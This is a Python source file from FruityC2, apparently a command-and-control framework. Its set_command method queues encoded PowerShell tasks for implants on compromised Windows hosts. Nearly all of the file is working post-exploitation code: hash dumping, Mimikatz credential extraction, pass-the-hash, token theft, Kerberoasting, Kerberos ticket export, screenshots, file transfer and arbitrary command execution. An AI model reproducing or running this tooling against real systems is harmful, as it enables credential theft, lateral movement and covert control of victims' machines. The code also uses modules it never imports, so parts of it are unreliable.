#!/usr/bin/python

# Copyright (C) 2017 xtr4nge [_AT_] gmail.com
#
# This program is free software: you can redistribute it and/or modify
# it under the terms of the GNU General Public License as published by
# the Free Software Foundation, either version 3 of the License, or
# (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program.  If not, see <http://www.gnu.org/licenses/>.
#

import os, sys, getopt
import traceback
import time, datetime
import base64

# LIBS
from lib.global_data import *
from lib.Utils import *
from lib.EmpireHelpers import *

class Control():
    def __init__(self):
        pass
    
    def get_global(self):
        print gdata.target
    
    def set_command(self, param, param_target):
        # IMPORT A POWERSHELL MODULE ON THE TARGET
        if param.startswith("powershell-import"):
            # ENCODE SCRIPT
            script_path = param.replace("powershell-import ","").strip()
            #print script_path
            #with open('ps/PowerUp.ps1') as f:
            with open(script_path) as f:
                encoded = base64.b64encode(f.read())
    
            utimestamp = int(time.time())
            _exec = ("%s|%s|%s") % ("powershell-import", utimestamp, encoded)
            gdata.target[param_target]["exec"] = _exec
        
        # DUMP HASHES FROM THE TARGET
        elif param == "hashdump":
            with open("modules/core/Get-PassHashes.ps1") as f:
                encoded = base64.b64encode(f.read())
            utimestamp = int(time.time())
            _exec = ("%s|%s|%s") % ("powershell-runscript", utimestamp, encoded)
            gdata.target[param_target]["exec"] = _exec
        
        elif param == "hashdump-x":
            with open("ps/Get-PassHashes.ps1") as f:
                encoded = base64.b64encode(f.read())
            lines = encoded.split("\n")
            encoded = ""
            for line in lines:
                encoded += line
            utimestamp = int(time.time())
            _exec = ("%s|%s") % ("powershell-encoded -e " + encoded, utimestamp)
            gdata.target[param_target]["exec"] = _exec
        
        # DUMP WITH MIMIKATZ
        elif param == "mimikatz":
            with open("modules/core/Invoke-Mimikatz.ps1") as f:
                #encoded = base64.b64encode(f.read() + "; Invoke-Mimikatz ;")
                encoded_import = powershell_encoder(f.read())
            encoded = powershell_encoder("Invoke-Mimikatz")
            utimestamp = int(time.time())
            _exec = ("%s|%s|%s|%s") % ("powershell-encoded", utimestamp, encoded, encoded_import)
            gdata.target[param_target]["exec"] = _exec
        
        # GET VULNERABLE SERVICES WITHOUT USING SC.exe
        elif param == "check_services":
            with open("modules/core/Invoke-CheckServices.ps1") as f:
                encoded = base64.b64encode(f.read())
            utimestamp = int(time.time())
            _exec = ("%s|%s|%s") % ("powershell-runscript", utimestamp, encoded)
            gdata.target[param_target]["exec"] = _exec
        
        # GET PROCESS LIST
        elif param == "ps":
            utimestamp = int(time.time())
            #encoded = powershell_encoder("Get-Process | select processname,Id,@{l='Owner';e={$owners[$_.id.tostring()]}}")
            encoded = powershell_encoder("gwmi win32_process |select Handle, Name, @{l='User name';e={$_.getowner().user}} | FT -Property * -AutoSize")
            #print encoded
            _exec = ("%s|%s") % ("powershell powershell -e " + encoded, utimestamp)
            gdata.target[param_target]["exec"] = _exec
        
        # UPLOAD FILE TO THE TARGET
        elif param.startswith("upload"):
            data = param.split(" ")
            upload_name = data[1].split("/")
            filename = open(data[1], "rb")
            out = ""
            with filename:
                byte = filename.read()
                for b in byte:
                    hexadecimal = binascii.hexlify(b)
                    decimal = int(hexadecimal, 16)
                    out += str(decimal) + " "
            out = out.strip()
            #print out
            encoded = base64.b64encode(out)
            utimestamp = int(time.time())
            _exec = ("%s|%s|%s") % ("upload " + upload_name[-1], utimestamp, encoded)
            gdata.target[param_target]["exec"] = _exec
        
        # DOWNLOAD FILE FROM THE TARGET
        elif param.startswith("download"):
            
            utimestamp = int(time.time())
            _exec = ("%s|%s") % (param, utimestamp)
            gdata.target[param_target]["exec"] = _exec
        
        # SCREENSHOT FROM AGENT
        elif param == "screenshot":
            with open("modules/core/Get-Screenshot.ps1") as f:
                encoded = base64.b64encode(f.read())
            utimestamp = int(time.time())
            _exec = ("%s|%s|%s") % ("powershell-runscript", utimestamp, encoded)
            gdata.target[param_target]["exec"] = _exec
        
        # PASS-THE-HASH MIMIKATZ
        elif param.startswith("mimikatz "):
            with open("modules/core/Invoke-Mimikatz.ps1") as f:
                encoded_import = powershell_encoder(f.read())
            utimestamp = int(time.time())
            #if param.startswith("pth"): command = re.sub("^pth ", "", param)
            if param.startswith("mimikatz"): command = re.sub("^mimikatz ", "", param)
            encoded = powershell_encoder("Invoke-Mimikatz -Command '\"%s\" exit'" % (command)) # EXAMPLE: mimikatz sekurlsa::pth /user:USERNAME /domain:DOMAIN /ntlm:HASH
            _exec = ("%s|%s|%s|%s") % ("powershell-encoded" , utimestamp, encoded, encoded_import)
            gdata.target[param_target]["exec"] = _exec
        
        # STEAL TOKEN FROM A PROCESS
        elif param.startswith("steal_token"):
            process_id = param.split(" ")[1]
            with open("modules/core/Invoke-TokenManipulation.ps1") as f:
                encoded_import = powershell_encoder(f.read())
            encoded = powershell_encoder("Invoke-TokenManipulation -ImpersonateUser -ProcessID %s" % (process_id))
            utimestamp = int(time.time())
            _exec = ("%s|%s|%s|%s") % ("powershell-encoded", utimestamp, encoded, encoded_import)
            gdata.target[param_target]["exec"] = _exec
            
        # REVERT TO ORIGINAL TOKEN
        elif param.startswith("rev2self") or param.startswith("revtoself"):
            with open("modules/core/Invoke-TokenManipulation.ps1") as f:
                encoded_import = powershell_encoder(f.read())
            encoded = powershell_encoder("Invoke-TokenManipulation -revtoself")
            utimestamp = int(time.time())
            _exec = ("%s|%s|%s|%s") % ("powershell-encoded", utimestamp, encoded, encoded_import)
            gdata.target[param_target]["exec"] = _exec
        
        # SCREENSHOT FROM AGENT
        elif param.startswith("ls") or param.startswith("dir"):
            utimestamp = int(time.time())
            _exec = ("%s|%s") % ("powershell " + param, utimestamp)
            gdata.target[param_target]["exec"] = _exec
        
        # SCREENSHOT FROM AGENT
        elif param.startswith("spn_search"):
            try:
                value = param.split(" ")[1]
                command = "Get-SPN-FruityC2 -search %s" % value
            except:
                command = "Get-SPN-FruityC2"

            with open("modules/core/Get-SPN-FruityC2.ps1") as f:
                encoded_import = powershell_encoder(f.read())
            encoded = powershell_encoder(command) # Get-SPN-FruityC2
            utimestamp = int(time.time())
            _exec = ("%s|%s|%s|%s") % ("powershell-encoded", utimestamp, encoded, encoded_import)
            gdata.target[param_target]["exec"] = _exec
        
        # SCREENSHOT FROM AGENT
        elif param.startswith("spn_request"):
            value = param.split(" ")[1]
            utimestamp = int(time.time())
            _exec = ("%s|%s") % ("powershell Add-Type -AssemblyName System.IdentityModel; New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList '%s';" % value, utimestamp)
            gdata.target[param_target]["exec"] = _exec
        
        # EXPORT KERBEROS TICKET WITH MIMIKATZ
        elif param.startswith("kerberos_ticket_dump"):
            with open("modules/core/Invoke-Mimikatz.ps1") as f:
                encoded_import = powershell_encoder(f.read())
            utimestamp = int(time.time())
            encoded = powershell_encoder("Invoke-Mimikatz -Command 'standard::base64 \"kerberos::list /export\" exit'")
            _exec = ("%s|%s|%s|%s") % ("powershell-encoded" , utimestamp, encoded, encoded_import)
            gdata.target[param_target]["exec"] = _exec
        
        # EXPORT KERBEROS TICKET WITH MIMIKATZ
        elif param.startswith("kerberos_ticket_purge"):
            with open("modules/core/Invoke-Mimikatz.ps1") as f:
                encoded_import = powershell_encoder(f.read())
            utimestamp = int(time.time())
            encoded = powershell_encoder("Invoke-Mimikatz -Command '\"kerberos::purge\" exit'")
            _exec = ("%s|%s|%s|%s") % ("powershell-encoded" , utimestamp, encoded, encoded_import)
            gdata.target[param_target]["exec"] = _exec
        
        # EXEC COMMAND ON THE TARGET
        else:
            #print "%sCOMMAND:%s %s" % (bcolors.BOLD, bcolors.ENDC, param)
            #print
            utimestamp = int(time.time())
            _exec = ("%s|%s") % (param, utimestamp)
            gdata.target[param_target]["exec"] = _exec
            
        return _exec